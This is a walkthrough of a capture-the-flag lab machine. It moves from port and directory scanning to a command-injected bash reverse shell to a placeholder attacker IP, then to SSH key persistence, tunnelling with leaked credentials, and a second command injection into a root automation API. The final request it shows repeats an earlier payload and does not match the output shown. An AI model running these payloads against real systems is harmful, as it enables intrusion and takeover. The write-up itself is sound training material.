# Day 11: Infinity Pool

|Category |Difficulty|
|:-------:|:--------:|
|Boot2Root|  Medium  |

**Skills learned:**
* Scanning a remote host with Nmap
* Web directory enumeration with Dirb
* Finding all active network sockets on a machine
* Connect to a remote host using SSH tunneling and local port forwarding
* Using linux command injection to read sensitive files

## Concierge Briefing
Byte Lotus Hotel promises a seamless stay powered by modern technology. Sometimes the most interesting systems are the ones guests were never meant to see.

## Today's Itinerary
* Find the user flag
* Find the root flag

## Initial Enumeration
We can start by running an Nmap scan against the machine: `nmap -sV -Pn -p- [MACHINE IP]`
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 18:35 -0400
Nmap scan report for 10.67.129.2
Host is up (0.023s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.71 seconds
```

We only have port **80** as an option to investigate further. Opening the web page `http://[MACHINE_IP]` brings us here:
*[Image: day11_webApp]*

Checking the page's source code did not provide any further clues. There is a button to **Book a suite**, but it cannot ce clicked. At the bottom of the page, it says **Internal systems: authorized staff only**.

I used [dirb](https://www.kali.org/tools/dirb/) to enumerate the server for other possible directories we can access: `dirb http://[MACHINE IP]`
```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Aug 12 18:36:20 2026
URL_BASE: http://10.67.129.2/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.67.129.2/ ----
+ http://10.67.129.2/robots.txt (CODE:200|SIZE:53)                                                                                             
+ http://10.67.129.2/status (CODE:200|SIZE:936)                                                              
-----------------
END_TIME: Wed Aug 12 18:41:16 2026
DOWNLOADED: 4612 - FOUND: 2
```

Navigating to the **/status** directory leads us here:

*[Image: day11_statusPage]*

And the **robots.txt** file contains one additional sub-directory *internal*:
```
User-agent: *
Disallow: /internal/
Disallow: /status
```

## Gaining a Foothold
Entering an IP address in the status page results in the site pinging the host:

*[Image: day11_ping]*

We can abuse the status page to spawn a reverse shell to our attacker machine. Inject a bash reverse shell payload into the page `[IP TO PING]; [REVERSE SHELL PAYLOAD]`.

First start a netcat listener with `nc -nlvp [LISTENING PORT]`. Now we can enter our full payload on the site: `[IP TO PING]; bash -c "bash -i >& /dev/tcp/[ATTACKER IP]/[LISTENING PORT] 0>&1"`, which will spawn a reverse shell.

*[Image: day11_revShell]*

now that we have user-level access on the machine, we can find the user flag in the **/home/web/user.txt** file.

## User Flag
**THM{n0_v1s\*\*\*\*_\*\*\*\*}**

## Escalating Privileges
I continued machine enumeration by using `ss` to check the active network sockets who are listening for incoming connections. The full command is `ss -tulpn`, where each of the flags represent:
* t: display TCP sockets
* u: display UDP sockets
* l: display only listening sockets
* p: show the process name & ID associated with the socket
* n: show numeric IP addresses

```
Netid State  Recv-Q Send-Q    Local Address:Port  Peer Address:PortProcess                                                     
udp   UNCONN 0      0               0.0.0.0:4569       0.0.0.0:*                                                               
udp   UNCONN 0      0               0.0.0.0:5060       0.0.0.0:*                                                               
udp   UNCONN 0      0               0.0.0.0:60707      0.0.0.0:*                                                               
udp   UNCONN 0      0            127.0.0.54:53         0.0.0.0:*                                                               
udp   UNCONN 0      0         127.0.0.53%lo:53         0.0.0.0:*                                                               
udp   UNCONN 0      0      10.67.129.2%ens5:68         0.0.0.0:*                                                               
udp   UNCONN 0      0                  [::]:33654         [::]:*                                                               
tcp   LISTEN 0      4096         127.0.0.54:53         0.0.0.0:*                                                               
tcp   LISTEN 0      4096            0.0.0.0:22         0.0.0.0:*                                                               
tcp   LISTEN 0      2048            0.0.0.0:80         0.0.0.0:*    users:(("gunicorn",pid=914,fd=5),("gunicorn",pid=665,fd=5))
tcp   LISTEN 0      2048          127.0.0.1:9000       0.0.0.0:*                                                               
tcp   LISTEN 0      2048          127.0.0.1:3000       0.0.0.0:*                                                               
tcp   LISTEN 0      10            127.0.0.1:5038       0.0.0.0:*                                                               
tcp   LISTEN 0      80            127.0.0.1:3306       0.0.0.0:*                                                               
tcp   LISTEN 0      4096      127.0.0.53%lo:53         0.0.0.0:*                                                               
tcp   LISTEN 0      511           127.0.0.1:8080       0.0.0.0:*                                                               
tcp   LISTEN 0      10            127.0.0.1:8088       0.0.0.0:*                                                               
tcp   LISTEN 0      10            127.0.0.1:8089       0.0.0.0:*                                                               
tcp   LISTEN 0      4096               [::]:22            [::]:*    
```

There are several local ports listening for connections, perhaps one of these will get us closer to the root flag. Start inspecting what is behind each one using `curl`.

We only find one useful finding behind **port 3000**: `curl http://127.0.0.1:3000`
```html
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Watchtower &mdash; ops console</title>
<style>
  body{margin:0;background:#0a0b0e;color:#e7e9ee;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
  header{padding:16px 24px;border-bottom:1px solid #262a31;letter-spacing:.2em}
  main{max-width:760px;margin:0 auto;padding:40px 24px}
  .tiles{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:20px}
  .tile{background:#15171c;border:1px solid #262a31;border-radius:10px;padding:18px}
  .tile b{display:block;font-size:1.6rem}
  .muted{color:#8b909b}
  code{color:#c9a24b}
</style>
</head>
<body>
<header>WATCHTOWER &middot; <span class="muted">internal</span></header>
<main>
  <h1>Surveillance operations</h1>
  <p class="muted">Loopback-only console. Authenticated by network position.</p>
  <div class="tiles">
    <div class="tile"><b>1184</b><span class="muted">active feeds</span></div>
    <div class="tile"><b>OK</b><span class="muted">datastore link</span></div>
    <div class="tile"><b>root</b><span class="muted">automation worker</span></div>
  </div>
  <p class="muted" style="margin-top:28px">
    Service endpoints: <code>/api/health</code> &middot; <code>/api/config</code>
  </p>
</main>
</body>
```

There is a Watchtower service who has two service endpoints: **/api/health** and **/api/config**. We can also use `curl` to inspect these:
`curl http://127.0.0.1:3000/api/config`
```
{"automation_endpoint":"http://127.0.0.1:9000","note":"internal network only -- do not expose","ops_note":"UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.","telephony_pass":"St4yN0t1c3d_2026","telephony_portal":"http://127.0.0.1:8080/ucp","telephony_user":"FreePBXUCPTemplateCreator"}
```

`curl http://127.0.0.1:3000/api/health`
```
{"bind":"127.0.0.1:3000","service":"watchtower","status":"ok"}
```

The **/api/config** endpoint has exposed UCP telephony credentials to us: **FreePBXUCPTemplateCreator:St4yN0t1c3d_2026**. However, these services are not accessible by our browser since they are listening on the loopback address. In order for us to access them, we must *tunnel* our way in.

We can use SSH tunneling with port forwarding to access the network over an SSH connection. The steps required for this include:
1. Creating a new RSA keypair
2. Write the new public key to the target machine
3. Create the SSH tunnel using the new keypair

Create a new RSA keypair using the `ssh-keygen -t rsa -f ~/.ssh/[KEY NAME] -N ""`. The private key created will have an empty passphrase (-N "").

Next, write our new public key to the machine's list of **authorized_keys**. Inside the **web@tryhackme-2404** terminal session, use this command to write the keypair:
`web@tryhackme-2404:~/.ssh$ echo "[PUBLIC KEY DATA HERE]" >> authorized_keys`.

On our attacker machine, we can create the SSH tunnel using the command `ssh -i ~/.ssh/[KEY NAME] -L 8080:127.0.0.1:8080 web@[MACHINE IP]`. This will also configure local port forwarding (-L) to forward connections from our attacker machine's port 8080 to the remote host's port 8080.

After the port forwarding has been configured, we can open a local web browser and access the UCP telephony service we discovered. We're brought to a login page, but we have credentials to login with: *FreePBXUCPTemplateCreator:St4yN0t1c3d_2026*.

*[Image: day11_ucpLogin]*

The UCP dashboard gives us the option to create a variety of new dashboard widgets. Clicking the green **+** button will create each new widget and add it to our dashboard. After adding each widget to our dashboard, we can see:

*[Image: day11_ucpDashboard]*

Looking closer, the **Voicemail** widget contains a clue: **"Automation Key cc_auto_7b3f9a1c4e0d2f6a"**. We can use this key to authenticate to the *automation endpoint* found on port 9000. 

We can check the */health* of the automation endpoint to see if there is any further information we can gather: `curl http://127.0.0.1:9000/health`
```
{"endpoints":{"GET /health":"service status","POST /jobs/export":{"auth":"Authorization: Bearer <automation key>","body":{"report":"<report name>"},"desc":"archive the latest data export"}},"runs_as":"root","service":"automation","status":"ok"}
```

Now we know we need to send a **POST** request to the **/jobs/export** endpoint using the automation key as authorization. My first example request was:
```
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
-H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
-H 'Content-Type: application/json' \
--data-binary '{"report":"test"}' 
```

The response was: ```{"command":"tar czf /var/automation/exports/test.tgz /var/automation/data 2>&1","output":"tar: Removing leading /`/' from member names\n"}`.```
Perhaps we can inject commands into the *--data-binary* field to read the root flag.

The first injected command I attempted was `ls`:
```
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
-H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
-H 'Content-Type: application/json' \
--data-binary '{"report":"test;ls;#"}' 
```

And got the directory listing in return: 
```
{"command":"tar czf /var/automation/exports/test;ls;#.tgz /var/automation/data 2>&1","output":"__pycache__\napp.py\nautomation.env\nrequirements.txt\nvenv\nwsgi.py\ntar: Cowardly refusing to create an empty archive\nTry 'tar --help' or 'tar --usage' for more information.\n"}
```

Finally, I injected a command to print the contents of the flag held in **/root/root.txt**:
```
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
-H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
-H 'Content-Type: application/json' \
--data-binary '{"report":"test;ls;#"}' 
```

## Root Flag
The root flag is found in the server response from the latest `curl` command:
```
{"command":"tar czf /var/automation/exports/test;cat /root/root.txt;#.tgz /var/automation/data 2>&1","output":"[FLAG FOUND HERE]\ntar: Cowardly refusing to create an empty archive\nTry 'tar --help' or 'tar --usage' for more information.\n"}
```

**THM{tr4c3d_\*\*_\*\*\*_\*\*\*\*\*\*\*}**